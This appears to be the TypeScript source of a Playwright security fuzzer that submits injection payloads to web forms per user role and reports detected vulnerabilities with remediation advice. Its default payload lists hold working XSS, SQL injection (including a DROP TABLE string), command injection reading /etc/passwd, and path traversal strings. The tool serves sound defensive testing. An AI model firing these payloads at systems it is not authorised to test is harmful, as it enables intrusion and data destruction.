import { Browser, BrowserContext, Page, chromium, Request, Response } from 'playwright';
import { MCPSmartCrawler } from './smart-crawler';
import { 
  UserRole, 
  PathResult, 
  NavigationMap, 
  CrawlerConfig
} from './types';
import { TEST_USERS } from './test-users';
import * as fs from 'fs/promises';
import * as path from 'path';

// Security Fuzzing Configuration
export interface SecurityFuzzerConfig extends CrawlerConfig {
  payloadSets: PayloadSet[];
  vulnerabilityTypes: VulnerabilityType[];
  apiInterception: boolean;
  consoleMonitoring: boolean;
  networkAnalysis: boolean;
  securityEventLogging: boolean;
  maxPayloadsPerField: number;
  timeoutPerPayload: number;
  securityHeaders: boolean;
}

export interface PayloadSet {
  name: string;
  category: 'xss' | 'sqli' | 'cmdi' | 'path_traversal' | 'ldap' | 'xml' | 'json' | 'buffer_overflow';
  payloads: string[];
  description: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
}

export interface VulnerabilityType {
  name: string;
  category: string;
  detectionMethod: 'response_analysis' | 'error_detection' | 'timing_analysis' | 'console_monitoring';
  indicators: string[];
  riskLevel: 'low' | 'medium' | 'high' | 'critical';
}

export interface SecurityTestResult {
  url: string;
  role: string;
  inputField: string;
  payload: string;
  payloadType: string;
  vulnerable: boolean;
  vulnerability: VulnerabilityType | null;
  evidence: SecurityEvidence;
  timestamp: string;
  responseTime: number;
}

export interface SecurityEvidence {
  screenshot?: string;
  consoleErrors: string[];
  networkRequests: NetworkCapture[];
  responseBody?: string;
  statusCode?: number;
  headers?: Record<string, string>;
  domChanges?: string[];
}

export interface NetworkCapture {
  url: string;
  method: string;
  headers: Record<string, string>;
  postData?: string;
  responseHeaders: Record<string, string>;
  responseBody?: string;
  statusCode: number;
  timing: number;
}

export interface FormInput {
  selector: string;
  type: string;
  name: string;
  placeholder?: string;
  required: boolean;
  maxLength?: number;
  pattern?: string;
}

export interface SecurityAnalysisReport {
  summary: SecuritySummary;
  vulnerabilities: SecurityTestResult[];
  formAnalysis: FormAnalysis[];
  apiAnalysis: APIAnalysis[];
  recommendations: SecurityRecommendation[];
  executionMetrics: ExecutionMetrics;
}

export interface SecuritySummary {
  totalTests: number;
  vulnerabilityCount: number;
  criticalCount: number;
  highCount: number;
  mediumCount: number;
  lowCount: number;
  formsAnalyzed: number;
  payloadsExecuted: number;
  executionTime: number;
  successRate: number;
}

export interface FormAnalysis {
  url: string;
  role: string;
  formSelector: string;
  inputFields: FormInput[];
  vulnerabilities: SecurityTestResult[];
  securityScore: number;
  recommendations: string[];
}

export interface APIAnalysis {
  endpoint: string;
  method: string;
  parameters: string[];
  vulnerabilities: SecurityTestResult[];
  securityHeaders: Record<string, string>;
  riskLevel: 'low' | 'medium' | 'high' | 'critical';
}

export interface SecurityRecommendation {
  category: 'input_validation' | 'output_encoding' | 'authentication' | 'authorization' | 'configuration';
  title: string;
  description: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  effort: 'low' | 'medium' | 'high';
  implementation: string[];
}

export interface ExecutionMetrics {
  startTime: string;
  endTime: string;
  totalDuration: number;
  rolesProcessed: number;
  formsProcessed: number;
  payloadsExecuted: number;
  requestsIntercepted: number;
  errorsDetected: number;
}

/**
 * MCPSecurityFuzzer - Advanced Security Testing Engine
 * Implements comprehensive vulnerability detection through form fuzzing,
 * API parameter manipulation, and security event monitoring
 */
export class MCPSecurityFuzzer extends MCPSmartCrawler {
  private securityConfig: SecurityFuzzerConfig;
  private networkCaptures: NetworkCapture[] = [];
  private consoleEvents: string[] = [];
  private vulnerabilities: SecurityTestResult[] = [];
  private executionMetrics: ExecutionMetrics;

  constructor(config: SecurityFuzzerConfig) {
    super(config);
    this.securityConfig = {
      maxPayloadsPerField: 50,
      timeoutPerPayload: 5000,
      apiInterception: true,
      consoleMonitoring: true,
      networkAnalysis: true,
      securityEventLogging: true,
      securityHeaders: true,
      ...config
    };

    this.executionMetrics = {
      startTime: new Date().toISOString(),
      endTime: '',
      totalDuration: 0,
      rolesProcessed: 0,
      formsProcessed: 0,
      payloadsExecuted: 0,
      requestsIntercepted: 0,
      errorsDetected: 0
    };
  }

  /**
   * Execute comprehensive security fuzzing across all roles
   */
  async executeFuzzingCampaign(): Promise<SecurityAnalysisReport> {
    console.log('🔐 Starting comprehensive security fuzzing campaign...');
    
    const startTime = Date.now();
    this.executionMetrics.startTime = new Date().toISOString();
    
    try {
      await this.initialize();
      
      // Execute form fuzzing for each role
      for (const [roleName, context] of this.contexts.entries()) {
        console.log(`🎯 Fuzzing role: ${roleName}`);
        await this.fuzzRoleSecurityBoundaries(roleName, context);
        this.executionMetrics.rolesProcessed++;
      }
      
      // Execute API parameter fuzzing
      await this.executeAPIParameterFuzzing();
      
      // Generate comprehensive security report
      const report = await this.generateSecurityReport();
      
      this.executionMetrics.endTime = new Date().toISOString();
      this.executionMetrics.totalDuration = Date.now() - startTime;
      
      console.log(`🔐 Security fuzzing completed in ${this.executionMetrics.totalDuration}ms`);
      console.log(`📊 Found ${this.vulnerabilities.length} potential vulnerabilities`);
      
      return report;
      
    } catch (error) {
      console.error('❌ Security fuzzing failed:', error);
      throw error;
    } finally {
      await this.cleanup();
    }
  }

  /**
   * Fuzz security boundaries for a specific role
   */
  private async fuzzRoleSecurityBoundaries(roleName: string, context: BrowserContext): Promise<void> {
    const page = await context.newPage();
    
    // Set up security monitoring
    await this.setupSecurityMonitoring(page, roleName);
    
    try {
      // Navigate to application (no authentication needed based on previous testing)
      await page.goto(this.config.baseURL);
      await page.waitForLoadState('domcontentloaded');
      
      // Get navigation paths for this role from parent class
      const navigationMap = await this.discoverNavigationPaths();
      const roleNavigation = navigationMap[roleName];
      
      if (roleNavigation && roleNavigation.discoveredPaths) {
        // Fuzz forms on discovered paths
        for (const pathResult of roleNavigation.discoveredPaths) {
          if (pathResult.accessible) {
            await this.fuzzPageForms(page, pathResult.path, roleName);
          }
        }
      } else {
        // Fallback: fuzz forms on the main page
        await this.fuzzPageForms(page, this.config.baseURL, roleName);
      }
      
    } catch (error) {
      console.error(`❌ Error fuzzing role ${roleName}:`, error);
      this.executionMetrics.errorsDetected++;
    } finally {
      await page.close();
    }
  }

  /**
   * Set up comprehensive security monitoring for a page
   */
  private async setupSecurityMonitoring(page: Page, roleName: string): Promise<void> {
    // Console error monitoring
    if (this.securityConfig.consoleMonitoring) {
      page.on('console', msg => {
        if (msg.type() === 'error' || msg.type() === 'warning') {
          const consoleEvent = `[${roleName}] ${msg.type().toUpperCase()}: ${msg.text()}`;
          this.consoleEvents.push(consoleEvent);
          console.log(`🚨 Console Event: ${consoleEvent}`);
        }
      });

      page.on('pageerror', error => {
        const errorEvent = `[${roleName}] PAGE ERROR: ${error.message}`;
        this.consoleEvents.push(errorEvent);
        console.log(`💥 Page Error: ${errorEvent}`);
      });
    }

    // Network request interception and analysis
    if (this.securityConfig.apiInterception) {
      page.on('request', async (request: Request) => {
        await this.analyzeSecurityHeaders(request);
      });

      page.on('response', async (response: Response) => {
        await this.captureNetworkResponse(response, roleName);
        this.executionMetrics.requestsIntercepted++;
      });
    }

    // Security event monitoring
    if (this.securityConfig.securityEventLogging) {
      await page.addInitScript(() => {
        // Override sensitive functions to detect potential attacks
        window.originalAlert = window.alert;
        window.alert = function(message) {
          console.error('SECURITY_EVENT_ALERT:', message);
          return window.originalAlert(message);
        };

        window.originalEval = window.eval;
        window.eval = function(code) {
          console.error('SECURITY_EVENT_EVAL:', code);
          return window.originalEval(code);
        };
      });
    }
  }

  /**
   * Discover and fuzz all forms on a specific page
   */
  private async fuzzPageForms(page: Page, url: string, roleName: string): Promise<void> {
    try {
      await page.goto(url, { waitUntil: 'domcontentloaded' });
      
      // Discover all forms on the page
      const forms = await page.$$('form');
      
      for (let i = 0; i < forms.length; i++) {
        const form = forms[i];
        const formSelector = `form:nth-of-type(${i + 1})`;
        
        console.log(`📝 Fuzzing form ${i + 1} on ${url} for role ${roleName}`);
        await this.fuzzForm(page, form, formSelector, url, roleName);
        this.executionMetrics.formsProcessed++;
      }
      
    } catch (error) {
      console.error(`❌ Error fuzzing forms on ${url}:`, error);
    }
  }

  /**
   * Execute comprehensive form fuzzing with security payloads
   */
  private async fuzzForm(page: Page, form: any, formSelector: string, url: string, roleName: string): Promise<void> {
    try {
      // Discover input fields
      const inputFields = await this.analyzeFormInputs(page, formSelector);
      
      // Execute fuzzing for each payload set
      for (const payloadSet of this.securityConfig.payloadSets) {
        console.log(`🔧 Testing ${payloadSet.category} payloads on ${formSelector}`);
        
        const payloadsToTest = payloadSet.payloads.slice(0, this.securityConfig.maxPayloadsPerField);
        
        for (const payload of payloadsToTest) {
          await this.executePayloadTest(page, inputFields, payload, payloadSet, url, roleName, formSelector);
          this.executionMetrics.payloadsExecuted++;
          
          // Small delay to avoid overwhelming the server
          await page.waitForTimeout(100);
        }
      }
      
    } catch (error) {
      console.error(`❌ Error fuzzing form ${formSelector}:`, error);
    }
  }

  /**
   * Analyze form inputs to understand field types and constraints
   */
  private async analyzeFormInputs(page: Page, formSelector: string): Promise<FormInput[]> {
    return await page.evaluate((selector) => {
      const form = document.querySelector(selector);
      if (!form) return [];
      
      const inputs = form.querySelectorAll('input, textarea, select');
      const inputFields: any[] = [];
      
      inputs.forEach((input: any) => {
        inputFields.push({
          selector: `${selector} [name="${input.name}"], ${selector} #${input.id}`,
          type: input.type || input.tagName.toLowerCase(),
          name: input.name || input.id || 'unnamed',
          placeholder: input.placeholder,
          required: input.required,
          maxLength: input.maxLength > 0 ? input.maxLength : undefined,
          pattern: input.pattern
        });
      });
      
      return inputFields;
    }, formSelector);
  }

  /**
   * Execute a single payload test against form inputs
   */
  private async executePayloadTest(
    page: Page,
    inputFields: FormInput[],
    payload: string,
    payloadSet: PayloadSet,
    url: string,
    roleName: string,
    formSelector: string
  ): Promise<void> {
    const testStartTime = Date.now();
    
    try {
      // Clear existing console events for this test
      const consoleEventsBeforeTest = this.consoleEvents.length;
      
      // Fill form with payload
      for (const field of inputFields) {
        if (field.type !== 'hidden' && field.type !== 'submit') {
          await page.fill(field.selector, payload, { timeout: this.securityConfig.timeoutPerPayload });
        }
      }
      
      // Submit form and capture response
      const [response] = await Promise.all([
        page.waitForResponse('**', { timeout: this.securityConfig.timeoutPerPayload }).catch(() => null),
        page.click(`${formSelector} [type="submit"], ${formSelector} button[type="submit"]`).catch(() => {
          // Fallback: try pressing Enter
          return page.press(`${formSelector} input:first-of-type`, 'Enter');
        })
      ]);
      
      // Check for vulnerabilities
      const vulnerability = await this.detectVulnerability(page, response, payload, payloadSet);
      
      // Collect evidence
      const evidence = await this.collectSecurityEvidence(
        page, 
        response, 
        consoleEventsBeforeTest,
        url,
        roleName
      );
      
      // Record test result
      const testResult: SecurityTestResult = {
        url,
        role: roleName,
        inputField: inputFields.map(f => f.name).join(', '),
        payload,
        payloadType: payloadSet.category,
        vulnerable: vulnerability !== null,
        vulnerability,
        evidence,
        timestamp: new Date().toISOString(),
        responseTime: Date.now() - testStartTime
      };
      
      if (vulnerability) {
        this.vulnerabilities.push(testResult);
        console.log(`🚨 VULNERABILITY DETECTED: ${vulnerability.name} in ${url} (${roleName})`);
      }
      
    } catch (error) {
      console.error(`❌ Error testing payload "${payload.substring(0, 50)}...":`, error);
    }
  }

  /**
   * Detect vulnerabilities based on response analysis
   */
  private async detectVulnerability(
    page: Page,
    response: Response | null,
    payload: string,
    payloadSet: PayloadSet
  ): Promise<VulnerabilityType | null> {
    
    for (const vulnType of this.securityConfig.vulnerabilityTypes) {
      if (vulnType.category === payloadSet.category) {
        
        // Response analysis detection
        if (vulnType.detectionMethod === 'response_analysis' && response) {
          const responseBody = await response.text().catch(() => '');
          
          for (const indicator of vulnType.indicators) {
            if (responseBody.includes(indicator) || responseBody.includes(payload)) {
              return vulnType;
            }
          }
        }
        
        // Console monitoring detection
        if (vulnType.detectionMethod === 'console_monitoring') {
          const recentConsoleEvents = this.consoleEvents.slice(-5);
          
          for (const indicator of vulnType.indicators) {
            if (recentConsoleEvents.some(event => event.includes(indicator))) {
              return vulnType;
            }
          }
        }
        
        // DOM changes detection (for XSS)
        if (vulnType.detectionMethod === 'response_analysis' && payloadSet.category === 'xss') {
          try {
            const domContent = await page.content();
            if (domContent.includes(payload)) {
              return vulnType;
            }
          } catch (error) {
            // Ignore DOM analysis errors
          }
        }
      }
    }
    
    return null;
  }

  /**
   * Collect comprehensive security evidence
   */
  private async collectSecurityEvidence(
    page: Page,
    response: Response | null,
    consoleEventsBeforeTest: number,
    url: string,
    roleName: string
  ): Promise<SecurityEvidence> {
    const evidence: SecurityEvidence = {
      consoleErrors: this.consoleEvents.slice(consoleEventsBeforeTest),
      networkRequests: this.networkCaptures.slice(-5) // Last 5 network requests
    };
    
    // Capture screenshot if there might be visual evidence
    if (this.consoleEvents.length > consoleEventsBeforeTest) {
      try {
        const timestamp = Date.now();
        const screenshotPath = `results/security-evidence-${roleName}-${timestamp}.png`;
        await page.screenshot({ path: screenshotPath, fullPage: false });
        evidence.screenshot = screenshotPath;
      } catch (error) {
        console.error('❌ Error capturing security evidence screenshot:', error);
      }
    }
    
    // Capture response details
    if (response) {
      evidence.statusCode = response.status();
      evidence.headers = response.headers();
      
      try {
        evidence.responseBody = (await response.text()).substring(0, 1000); // First 1KB
      } catch (error) {
        // Ignore response body capture errors
      }
    }
    
    return evidence;
  }

  /**
   * Execute API parameter fuzzing
   */
  private async executeAPIParameterFuzzing(): Promise<void> {
    console.log('🌐 Executing API parameter fuzzing...');
    
    // Analyze captured network requests for API endpoints
    const apiEndpoints = this.extractAPIEndpoints(this.networkCaptures);
    
    for (const endpoint of apiEndpoints) {
      console.log(`🔧 Fuzzing API endpoint: ${endpoint.method} ${endpoint.url}`);
      await this.fuzzAPIEndpoint(endpoint);
    }
  }

  /**
   * Extract API endpoints from network captures
   */
  private extractAPIEndpoints(networkCaptures: NetworkCapture[]): APIEndpoint[] {
    const endpoints: APIEndpoint[] = [];
    const uniqueEndpoints = new Set<string>();
    
    for (const capture of networkCaptures) {
      const endpointKey = `${capture.method}:${capture.url}`;
      
      if (!uniqueEndpoints.has(endpointKey) && this.isAPIEndpoint(capture)) {
        uniqueEndpoints.add(endpointKey);
        endpoints.push({
          url: capture.url,
          method: capture.method,
          headers: capture.headers,
          parameters: this.extractParameters(capture)
        });
      }
    }
    
    return endpoints;
  }

  /**
   * Determine if a network request represents an API endpoint
   */
  private isAPIEndpoint(capture: NetworkCapture): boolean {
    return (
      capture.url.includes('/api/') ||
      capture.url.includes('/graphql') ||
      capture.method !== 'GET' ||
      capture.headers['content-type']?.includes('application/json')
    );
  }

  /**
   * Extract parameters from network capture
   */
  private extractParameters(capture: NetworkCapture): string[] {
    const parameters: string[] = [];
    
    // Extract query parameters
    try {
      const url = new URL(capture.url);
      for (const [key] of url.searchParams) {
        parameters.push(key);
      }
    } catch (error) {
      // Ignore URL parsing errors
    }
    
    // Extract POST data parameters
    if (capture.postData) {
      try {
        const postData = JSON.parse(capture.postData);
        parameters.push(...Object.keys(postData));
      } catch (error) {
        // Try form data format
        if (capture.postData.includes('=')) {
          const formParams = capture.postData.split('&');
          for (const param of formParams) {
            const [key] = param.split('=');
            if (key) parameters.push(key);
          }
        }
      }
    }
    
    return parameters;
  }

  /**
   * Fuzz individual API endpoint
   */
  private async fuzzAPIEndpoint(endpoint: APIEndpoint): Promise<void> {
    // Implementation would include API parameter manipulation
    // For now, logging the discovered endpoint
    console.log(`📍 Discovered API endpoint: ${endpoint.method} ${endpoint.url} with parameters: ${endpoint.parameters.join(', ')}`);
  }

  /**
   * Capture and analyze network responses
   */
  private async captureNetworkResponse(response: Response, roleName: string): Promise<void> {
    try {
      const request = response.request();
      
      const networkCapture: NetworkCapture = {
        url: response.url(),
        method: request.method(),
        headers: request.headers(),
        postData: request.postData() || undefined,
        responseHeaders: response.headers(),
        statusCode: response.status(),
        timing: Date.now(),
        responseBody: undefined // Captured separately for security analysis
      };
      
      this.networkCaptures.push(networkCapture);
      
      // Keep only recent captures to manage memory
      if (this.networkCaptures.length > 1000) {
        this.networkCaptures = this.networkCaptures.slice(-500);
      }
      
    } catch (error) {
      console.error('❌ Error capturing network response:', error);
    }
  }

  /**
   * Analyze security headers
   */
  private async analyzeSecurityHeaders(request: Request): Promise<void> {
    if (this.securityConfig.securityHeaders) {
      const headers = request.headers();
      
      // Check for security-related headers
      const securityHeaders = [
        'x-frame-options',
        'x-content-type-options',
        'x-xss-protection',
        'strict-transport-security',
        'content-security-policy'
      ];
      
      const missingHeaders = securityHeaders.filter(header => !headers[header]);
      
      if (missingHeaders.length > 0) {
        console.log(`⚠️ Missing security headers on ${request.url()}: ${missingHeaders.join(', ')}`);
      }
    }
  }

  /**
   * Generate comprehensive security analysis report
   */
  private async generateSecurityReport(): Promise<SecurityAnalysisReport> {
    console.log('📊 Generating comprehensive security analysis report...');
    
    const summary = this.generateSecuritySummary();
    const formAnalysis = this.analyzeFormSecurity();
    const apiAnalysis = this.analyzeAPISecurity();
    const recommendations = this.generateSecurityRecommendations();
    
    const report: SecurityAnalysisReport = {
      summary,
      vulnerabilities: this.vulnerabilities,
      formAnalysis,
      apiAnalysis,
      recommendations,
      executionMetrics: this.executionMetrics
    };
    
    // Save report to file
    await this.saveSecurityReport(report);
    
    return report;
  }

  /**
   * Generate security summary statistics
   */
  private generateSecuritySummary(): SecuritySummary {
    const criticalCount = this.vulnerabilities.filter(v => v.vulnerability?.riskLevel === 'critical').length;
    const highCount = this.vulnerabilities.filter(v => v.vulnerability?.riskLevel === 'high').length;
    const mediumCount = this.vulnerabilities.filter(v => v.vulnerability?.riskLevel === 'medium').length;
    const lowCount = this.vulnerabilities.filter(v => v.vulnerability?.riskLevel === 'low').length;
    
    return {
      totalTests: this.executionMetrics.payloadsExecuted,
      vulnerabilityCount: this.vulnerabilities.length,
      criticalCount,
      highCount,
      mediumCount,
      lowCount,
      formsAnalyzed: this.executionMetrics.formsProcessed,
      payloadsExecuted: this.executionMetrics.payloadsExecuted,
      executionTime: this.executionMetrics.totalDuration,
      successRate: ((this.executionMetrics.payloadsExecuted - this.executionMetrics.errorsDetected) / this.executionMetrics.payloadsExecuted) * 100
    };
  }

  /**
   * Analyze form-specific security
   */
  private analyzeFormSecurity(): FormAnalysis[] {
    // Group vulnerabilities by URL and form
    const formGroups = new Map<string, SecurityTestResult[]>();
    
    this.vulnerabilities.forEach(vuln => {
      const key = `${vuln.url}:${vuln.role}`;
      if (!formGroups.has(key)) {
        formGroups.set(key, []);
      }
      formGroups.get(key)!.push(vuln);
    });
    
    return Array.from(formGroups.entries()).map(([key, vulns]) => {
      const [url, role] = key.split(':');
      return {
        url,
        role,
        formSelector: 'form', // Simplified for this implementation
        inputFields: [], // Would be populated with detailed field analysis
        vulnerabilities: vulns,
        securityScore: Math.max(0, 100 - (vulns.length * 20)),
        recommendations: this.generateFormRecommendations(vulns)
      };
    });
  }

  /**
   * Analyze API-specific security
   */
  private analyzeAPISecurity(): APIAnalysis[] {
    const apiEndpoints = this.extractAPIEndpoints(this.networkCaptures);
    
    return apiEndpoints.map(endpoint => ({
      endpoint: endpoint.url,
      method: endpoint.method,
      parameters: endpoint.parameters,
      vulnerabilities: this.vulnerabilities.filter(v => v.url === endpoint.url),
      securityHeaders: endpoint.headers,
      riskLevel: this.calculateAPIRiskLevel(endpoint)
    }));
  }

  /**
   * Generate security recommendations
   */
  private generateSecurityRecommendations(): SecurityRecommendation[] {
    const recommendations: SecurityRecommendation[] = [];
    
    // Input validation recommendations
    if (this.vulnerabilities.some(v => v.payloadType === 'xss' || v.payloadType === 'sqli')) {
      recommendations.push({
        category: 'input_validation',
        title: 'Implement Comprehensive Input Validation',
        description: 'All user inputs should be validated and sanitized before processing',
        severity: 'high',
        effort: 'medium',
        implementation: [
          'Implement server-side input validation for all form fields',
          'Use parameterized queries to prevent SQL injection',
          'Sanitize and encode output to prevent XSS attacks',
          'Implement Content Security Policy (CSP) headers'
        ]
      });
    }
    
    // Security headers recommendations
    recommendations.push({
      category: 'configuration',
      title: 'Implement Security Headers',
      description: 'Add security headers to protect against common attacks',
      severity: 'medium',
      effort: 'low',
      implementation: [
        'Add X-Frame-Options header to prevent clickjacking',
        'Implement Content-Security-Policy header',
        'Add X-Content-Type-Options: nosniff header',
        'Enable Strict-Transport-Security for HTTPS'
      ]
    });
    
    return recommendations;
  }

  /**
   * Generate form-specific recommendations
   */
  private generateFormRecommendations(vulnerabilities: SecurityTestResult[]): string[] {
    const recommendations: string[] = [];
    
    if (vulnerabilities.some(v => v.payloadType === 'xss')) {
      recommendations.push('Implement output encoding for all user inputs displayed on the page');
      recommendations.push('Add Content Security Policy (CSP) to prevent script injection');
    }
    
    if (vulnerabilities.some(v => v.payloadType === 'sqli')) {
      recommendations.push('Use parameterized queries for all database operations');
      recommendations.push('Implement input validation with whitelisting approach');
    }
    
    return recommendations;
  }

  /**
   * Calculate API risk level
   */
  private calculateAPIRiskLevel(endpoint: APIEndpoint): 'low' | 'medium' | 'high' | 'critical' {
    let riskScore = 0;
    
    // Higher risk for POST/PUT/DELETE methods
    if (['POST', 'PUT', 'DELETE'].includes(endpoint.method)) {
      riskScore += 2;
    }
    
    // Higher risk for endpoints with many parameters
    riskScore += Math.min(endpoint.parameters.length, 3);
    
    // Higher risk for admin/sensitive endpoints
    if (endpoint.url.includes('admin') || endpoint.url.includes('user')) {
      riskScore += 2;
    }
    
    if (riskScore >= 6) return 'critical';
    if (riskScore >= 4) return 'high';
    if (riskScore >= 2) return 'medium';
    return 'low';
  }

  /**
   * Save security report to file
   */
  private async saveSecurityReport(report: SecurityAnalysisReport): Promise<void> {
    await fs.mkdir('results', { recursive: true });
    
    const reportPath = path.join('results', 'security-fuzzing-report.json');
    await fs.writeFile(reportPath, JSON.stringify(report, null, 2));
    
    console.log(`💾 Security report saved to ${reportPath}`);
  }

  /**
   * Get contexts for testing purposes
   */
  public getContexts(): Map<string, BrowserContext> {
    return this.contexts;
  }

  /**
   * Get contexts as object for testing purposes
   */
  public getContextsAsObject(): Record<string, BrowserContext> {
    const obj: Record<string, BrowserContext> = {};
    for (const [key, value] of this.contexts.entries()) {
      obj[key] = value;
    }
    return obj;
  }

  /**
   * Get default security payload sets
   */
  static getDefaultPayloadSets(): PayloadSet[] {
    return [
      {
        name: 'XSS Basic',
        category: 'xss',
        description: 'Basic Cross-Site Scripting payloads',
        severity: 'high',
        payloads: [
          '<script>alert("XSS")</script>',
          '<img src=x onerror=alert("XSS")>',
          '<svg onload=alert("XSS")>',
          'javascript:alert("XSS")',
          '<iframe src="javascript:alert(\'XSS\')">',
          '<body onload=alert("XSS")>',
          '<input onfocus=alert("XSS") autofocus>',
          '<select onfocus=alert("XSS") autofocus>',
          '<textarea onfocus=alert("XSS") autofocus>',
          '<keygen onfocus=alert("XSS") autofocus>'
        ]
      },
      {
        name: 'SQL Injection',
        category: 'sqli',
        description: 'SQL Injection attack payloads',
        severity: 'critical',
        payloads: [
          "' OR '1'='1",
          "' OR 1=1--",
          "' UNION SELECT NULL--",
          "'; DROP TABLE users--",
          "' OR 1=1#",
          "admin'--",
          "' OR 'a'='a",
          "1' OR '1'='1",
          "' OR '1'='1' /*",
          "x' AND 1=0 UNION SELECT TOP 1 name FROM sysobjects WHERE xtype='U"
        ]
      },
      {
        name: 'Command Injection',
        category: 'cmdi',
        description: 'Command injection payloads',
        severity: 'critical',
        payloads: [
          '| whoami',
          '; whoami',
          '`whoami`',
          '$(whoami)',
          '&& whoami',
          '|| whoami',
          '| cat /etc/passwd',
          '; cat /etc/passwd',
          '`cat /etc/passwd`',
          '$(cat /etc/passwd)'
        ]
      },
      {
        name: 'Path Traversal',
        category: 'path_traversal',
        description: 'Directory traversal payloads',
        severity: 'high',
        payloads: [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
          '....//....//....//etc/passwd',
          '../../../../../../../etc/passwd%00',
          '..%2F..%2F..%2Fetc%2Fpasswd',
          '..%252f..%252f..%252fetc%252fpasswd',
          '/var/www/../../etc/passwd',
          'C:\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
          'file:///etc/passwd'
        ]
      }
    ];
  }

  /**
   * Get default vulnerability detection rules
   */
  static getDefaultVulnerabilityTypes(): VulnerabilityType[] {
    return [
      {
        name: 'Cross-Site Scripting (XSS)',
        category: 'xss',
        detectionMethod: 'response_analysis',
        indicators: ['<script>', 'alert(', 'onerror=', 'onload=', 'javascript:'],
        riskLevel: 'high'
      },
      {
        name: 'SQL Injection',
        category: 'sqli',
        detectionMethod: 'error_detection',
        indicators: ['SQL syntax error', 'mysql_fetch', 'ORA-', 'Microsoft SQL', 'PostgreSQL', 'sqlite'],
        riskLevel: 'critical'
      },
      {
        name: 'Command Injection',
        category: 'cmdi',
        detectionMethod: 'response_analysis',
        indicators: ['uid=', 'gid=', 'root:', 'cmd.exe', 'command not found'],
        riskLevel: 'critical'
      },
      {
        name: 'Path Traversal',
        category: 'path_traversal',
        detectionMethod: 'response_analysis',
        indicators: ['root:x:', '[boot loader]', 'Windows Registry Editor'],
        riskLevel: 'high'
      }
    ];
  }
}

// Supporting interfaces for API fuzzing
interface APIEndpoint {
  url: string;
  method: string;
  headers: Record<string, string>;
  parameters: string[];
}